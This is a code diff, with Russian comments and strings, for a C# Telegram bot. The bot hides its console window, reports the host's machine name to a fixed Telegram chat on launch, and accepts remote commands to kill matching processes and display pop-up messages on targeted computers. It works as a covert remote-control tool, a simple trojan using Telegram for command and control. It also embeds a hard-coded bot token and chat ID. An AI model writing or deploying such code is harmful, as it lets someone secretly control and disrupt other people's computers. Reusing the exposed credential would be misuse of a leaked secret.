@@ -23,16 +23,18 @@ namespace TgBot
         const int SW_HIDE = 0;
         const int SW_SHOW = 5;
 
-
         static void Main(string[] args)
         {
+            string currentComputerName = Environment.MachineName.ToLower();
+            var client = new TelegramBotClient("5376040452:AAH7vnSweprjjIhWNQouiYAk40UvGBTb58o");
+
+            // Отправляем сообщение о запуске на конкретном ПК
+            client.SendTextMessageAsync("455077378", $"Бот запущен на ПК {currentComputerName}.");
+
             var handle = GetConsoleWindow();
             // Hide
             ShowWindow(handle, SW_HIDE);
 
-            // Show
-            // ShowWindow(handle, SW_SHOW);
-            var client = new TelegramBotClient("5376040452:AAH7vnSweprjjIhWNQouiYAk40UvGBTb58o");
             client.StartReceiving(Update, Error);
             Console.ReadLine();
         }
@@ -56,64 +58,73 @@ namespace TgBot
                     // Закрытие всякого
                     if (message.Text.ToLower().StartsWith("/getdown "))
                     {
-                        // Разделяем сообщение на команду и аргументы
-                        string[] commandParts = message.Text.Split('|');
+                        string commandText = message.Text.Substring("/getdown ".Length);
+                        string[] commandParts = commandText.Split('|');
 
                         if (commandParts.Length != 2)
                         {
-                            await botClient.SendTextMessageAsync(message.Chat.Id, "Команда должна иметь формат '/getdown <имя компьютера> | <часть имени процесса>'.");
+                            await botClient.SendTextMessageAsync(message.Chat.Id, "Команда должна иметь формат /getdown <часть имени процесса> | <имя компьютера>.");
                             return;
                         }
 
-                        string computerName = commandParts[0].Trim().Substring("/getdown ".Length).ToLower();
-                        string partialProcessName = commandParts[1].Trim().ToLower();
+                        string partialProcessName = commandParts[0].Trim();
+                        string computerName = commandParts[1].Trim();
+                        string currentComputerName = Environment.MachineName.ToLower();
 
-                        if (Environment.MachineName.ToLower() == computerName)
+                        if (computerName.ToLower() == currentComputerName.ToLower())
                         {
                             Process[] allProcesses = Process.GetProcesses();
 
                             bool processFound = false;
+                            bool computerFound = true;
 
-                            foreach (var process in allProcesses)
+                            foreach (Process process in allProcesses)
                             {
-                                if (process.ProcessName.ToLower().Contains(partialProcessName))
+                                string processName = process.ProcessName.ToLower();
+
+                                if (processName.Contains(partialProcessName))
                                 {
                                     process.Kill();
-                                    await botClient.SendTextMessageAsync(message.Chat.Id, $"Процесс '{process.ProcessName}' успешно закрыт.");
+                                    await botClient.SendTextMessageAsync(message.Chat.Id, $"Процесс {process.ProcessName} на компьютере {currentComputerName} успешно закрыт.");
                                     processFound = true;
                                 }
                             }
 
                             if (!processFound)
                             {
-                                await botClient.SendTextMessageAsync(message.Chat.Id, $"Не найден процесс с частичным совпадением '{partialProcessName}'.");
+                                await botClient.SendTextMessageAsync(message.Chat.Id, $"Процессы с частью имени {partialProcessName} на компьютере {currentComputerName} не найдены.");
                             }
-                        }
-                        else
-                        {
-                            await botClient.SendTextMessageAsync(message.Chat.Id, $"Команда выполнена на компьютере '{computerName}'.");
-                        }
+                            if (!computerFound)
+                            {
+                                await botClient.SendTextMessageAsync(message.Chat.Id, "Компьютер не найден.");
+                                return;
+                            }
+                        }  
                     }
+
                     // Сообщения
                     if (message.Text.StartsWith("/message "))
                     {
+                        string currentComputerName = Environment.MachineName.ToLower();
                         string commandText = message.Text.Substring("/message ".Length);
                         string[] parts = commandText.Split('|');
+
                         if (parts.Length < 2)
                         {
-                            await botClient.SendTextMessageAsync(message.Chat.Id, "Необходимо указать и текст сообщения, и название окна.");
+                            await botClient.SendTextMessageAsync(message.Chat.Id, "Команда должна иметь формат /message <текст> | <заголовок>.");
                             return;
                         }
+
                         string messageText = parts[0].Trim();
                         string windowTitle = parts[1].Trim();
+
                         if (string.IsNullOrWhiteSpace(messageText) || string.IsNullOrWhiteSpace(windowTitle))
                         {
                             await botClient.SendTextMessageAsync(message.Chat.Id, "Текст сообщения и название окна не могут быть пустыми.");
                             return;
                         }
                         MessageBox.Show(messageText, windowTitle);
-                        // await botClient.SendTextMessageAsync(message.Chat.Id, "Сообщение с заголовком: " + windowTitle + " и текстом: " + messageText + " было отправлено.");
-                        await botClient.SendTextMessageAsync(message.Chat.Id, $"Сообщение с заголовком: '{windowTitle}' и текстом '{messageText}' было отправлено.");
+                        await botClient.SendTextMessageAsync(message.Chat.Id, $"Сообщение с заголовком: {windowTitle} и текстом {messageText} было отправлено на компьютер {currentComputerName}.");
                     }
                 }
             }
